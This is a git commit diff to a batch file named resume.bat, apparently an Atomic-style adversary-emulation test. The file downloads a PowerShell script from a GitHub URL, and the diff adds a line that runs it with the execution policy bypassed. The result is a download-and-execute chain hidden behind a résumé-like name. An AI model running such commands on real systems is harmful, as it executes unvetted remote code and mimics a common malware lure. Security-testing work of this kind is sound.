41bd453ea848453e715b5fede22eabf057d68734
markersmake <bmag262@gmail.com>
2021-01-18 02:35:21 -0500

    Update resume.bat

--- resume.bat
+++ resume.bat
@@ -1,5 +1,6 @@
 echo "Atomic Test File" > test.txt
 
 powershell.exe iwr https://github.com/markersmake/RandomScripts/raw/master/update.ps1 -OutFile C:\Temp\update.ps1
+powershell.exe -exec Bypass C:\Temp\update.ps1
 
 del test.txt
